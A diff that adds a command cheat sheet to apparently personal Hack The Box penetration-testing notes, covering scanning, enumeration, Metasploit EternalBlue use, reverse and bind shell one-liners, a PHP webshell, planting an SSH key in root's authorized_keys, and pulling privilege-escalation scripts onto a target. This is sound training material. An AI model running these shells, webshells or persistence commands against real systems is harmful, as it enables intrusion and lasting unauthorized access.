@@ -257,6 +257,112 @@ sudo -l            # what can I run as root/another user?
 ```
 If I can write a user's `~/.ssh/authorized_keys`, I can drop my own public key and SSH in as them — stable access without a shaky reverse shell.
 
+## Full command reference (source notes)
+Complete "Basic Tools" command set — nothing trimmed. (Reverse/bind shells + webshell are standard one-liners; the fuller treatment is in module 08.)
+
+**General**
+| Command | Description |
+|---|---|
+| `sudo openvpn user.ovpn` | Connect to the lab VPN |
+| `ifconfig` / `ip a` | Show our IP address |
+| `netstat -rn` | Show networks reachable via the VPN |
+| `ssh user@10.10.10.10` | SSH to a remote server |
+| `ftp 10.129.42.253` | FTP to a remote server |
+
+**tmux**
+| Key/Command | Description |
+|---|---|
+| `tmux` | Start tmux |
+| `Ctrl+b` | Default prefix |
+| `prefix c` | New window |
+| `prefix 1` | Switch to window 1 |
+| `prefix Shift+%` | Split pane vertically |
+| `prefix Shift+"` | Split pane horizontally |
+| `prefix →` | Switch to the right pane |
+
+**Vim**
+| Key | Description |
+|---|---|
+| `vim file` | Open file in vim |
+| `Esc` + `i` | Enter insert mode |
+| `Esc` | Back to normal mode |
+| `x` / `dw` / `dd` | Cut character / word / full line |
+| `yw` / `yy` | Copy word / full line |
+| `p` | Paste |
+| `:1` | Go to line 1 |
+| `:w` / `:q` / `:q!` / `:wq` | Write / quit / quit no-save / write+quit |
+
+**Service scanning**
+| Command | Description |
+|---|---|
+| `nmap 10.129.42.253` | Run nmap on an IP |
+| `nmap -sV -sC -p- 10.129.42.253` | Script + version scan, all ports |
+| `locate scripts/citrix` | List available nmap scripts |
+| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run a specific NSE script |
+| `netcat 10.10.10.10 22` | Grab a service banner |
+| `smbclient -N -L \\\\10.129.42.253` | List SMB shares (null session) |
+| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
+| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
+| `onesixtyone -c dict.txt 10.129.42.254` | Brute-force SNMP community string |
+
+**Web enumeration**
+| Command | Description |
+|---|---|
+| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory scan |
+| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Sub-domain scan |
+| `curl -IL https://www.inlanefreight.com` | Grab website banner/headers |
+| `whatweb 10.10.10.121` | Webserver / cert details |
+| `curl 10.10.10.121/robots.txt` | List potential dirs in robots.txt |
+| `Ctrl+U` | View page source (Firefox) |
+
+**Public exploits**
+| Command | Description |
+|---|---|
+| `searchsploit openssh 7.2` | Search Exploit-DB for an app |
+| `msfconsole` | Start Metasploit |
+| `search exploit eternalblue` | Search exploits in MSF |
+| `use exploit/windows/smb/ms17_010_psexec` | Load an MSF module |
+| `show options` | Show required module options |
+| `set RHOSTS 10.10.10.40` | Set a module option |
+| `check` | Test if target is vulnerable |
+| `exploit` | Run the exploit |
+
+**Using shells** (standard one-liners — see module 08 for depth)
+| Command | Description |
+|---|---|
+| `nc -lvnp 1234` | Start a netcat listener |
+| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Reverse shell from the target |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Reverse shell (mkfifo) |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Bind shell on the target |
+| `nc 10.10.10.1 1234` | Connect to a bind shell |
+| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
+| `Ctrl+z` → `stty raw -echo` → `fg` → Enter×2 | Upgrade shell TTY (2) |
+| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a PHP webshell |
+| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command via webshell |
+
+**Privilege escalation**
+| Command | Description |
+|---|---|
+| `./linpeas.sh` | Enumerate a Linux host for privesc |
+| `sudo -l` | List sudo privileges |
+| `sudo -u user /bin/echo Hello World!` | Run a command as another user |
+| `sudo su -` | Switch to root (if allowed) |
+| `sudo su user -` | Switch to another user |
+| `ssh-keygen -f key` | Create a new SSH keypair |
+| `echo "ssh-rsa AAAAB...M= user@parrot" >> /root/.ssh/authorized_keys` | Add our pubkey to a user |
+| `ssh root@10.10.10.10 -i key` | SSH in with the generated private key |
+
+**Transferring files**
+| Command | Description |
+|---|---|
+| `python3 -m http.server 8000` | Start a local webserver |
+| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file to the target |
+| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file to the target |
+| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file via scp |
+| `base64 shell -w 0` | Encode a file to base64 |
+| `echo f0VMR...InmDwU \| base64 -d > shell` | Decode base64 back to a file |
+| `md5sum shell` | Verify the file transferred intact |
+
 ## 2. Setup
 - Attack box: HTB Pwnbox (Parrot), unlimited time
 - Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
